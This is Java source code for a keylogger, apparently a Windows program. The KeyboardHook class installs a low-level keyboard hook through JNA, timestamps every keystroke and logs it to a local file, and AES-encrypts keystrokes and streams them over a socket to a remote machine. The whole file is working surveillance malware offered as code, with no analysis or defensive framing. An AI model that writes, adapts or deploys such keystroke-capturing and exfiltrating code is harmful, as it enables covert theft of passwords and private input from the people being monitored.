package KeyLogger;

import java.awt.EventQueue;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import com.sun.jna.examples.win32.Kernel32;
import com.sun.jna.examples.win32.User32;
import com.sun.jna.examples.win32.User32.HHOOK;
import com.sun.jna.examples.win32.User32.KBDLLHOOKSTRUCT;
import com.sun.jna.examples.win32.User32.LowLevelKeyboardProc;
import com.sun.jna.examples.win32.User32.MSG;
import com.sun.jna.examples.win32.W32API.HMODULE;
import com.sun.jna.examples.win32.W32API.LRESULT;
import com.sun.jna.examples.win32.W32API.WPARAM;

import AES.AESCipher;
import AES.Struct;
 
 
public class KeyboardHook implements Runnable{
 
	private static HHOOK hhk;
	private static LowLevelKeyboardProc keyboardHook;
	final static User32 lib = User32.INSTANCE;
	private boolean [] on_off=null;
	volatile private int flag ;
	private Socket socket;
	private String key;
 
	public KeyboardHook(boolean [] on_off,Socket socket,String key){
		this.on_off = on_off;
		this.socket = socket;
		this.key = key;
		this.flag = 0;
	}
 
	public void run() {

		
		
		HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
		
		keyboardHook = new LowLevelKeyboardProc() {
			public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
				SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
				SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String fileName=df1.format(new Date());
				String time=df2.format(new Date());
				BufferedWriter bw1=null;
				BufferedWriter bw2=null;
				BufferedWriter bw=null;
				PrintWriter pw = null;
				try {
					bw1 = new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Keyboard.txt"),true));
					//bw2=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Common.txt"),true));
					
					 bw = new BufferedWriter(new OutputStreamWriter(
							socket.getOutputStream()));
					
					 pw = new PrintWriter(bw, true);
				
				} catch (IOException e) {
					e.printStackTrace();
				}
				if (on_off[0] == false) {
					System.exit(0);
				}
				try {
					//bw1.write(time+"  ####  "+info.vkCode+"\r\n");
					if((flag % 2) == 0){
					//System.out.println(time+":"+info.vkCode);
					String val = String.valueOf(info.vkCode);
					String timenow = String.valueOf(time);
					String getmessage = String.valueOf(timenow+"="+val);
					
					if(info.vkCode == 121){
						EventQueue.invokeLater(new Runnable(){
				            public void run(){
				                try {
				                   gui window = new gui();
				                   window.frame.setVisible(true);
				                }catch (Exception e) {
				                    e.printStackTrace();
				                }
				            }
				        });
					}
					
					
					AESCipher aes = new AESCipher();
					List<Struct> list = new ArrayList<Struct>();
					
					list = aes.encryptText(getmessage, key);
					
					//System.out.println("KEYLOG-"+info.vkCode+"-");
					pw.println("Croken "+list.size());
					pw.flush();
					for(Struct temp:list){
						pw.println(temp.str+" "+String.valueOf(temp.len));
						pw.flush();
					}
					
					}
					flag++;
					bw1.write(time+"  ####  "+ Relect.Relectkey(info.vkCode)+"\r\n");
					bw1.flush();
					//bw2.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
			}
		};
		
		hhk = lib.SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
		
		int result;
		MSG msg = new MSG();
		while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
			if (result == -1) {
				System.err.println("error in get message");
				break;
			} else {
				System.err.println("got message");
				lib.TranslateMessage(msg);
				lib.DispatchMessage(msg);
			}
		}
		lib.UnhookWindowsHookEx(hhk);
	}

	

 
}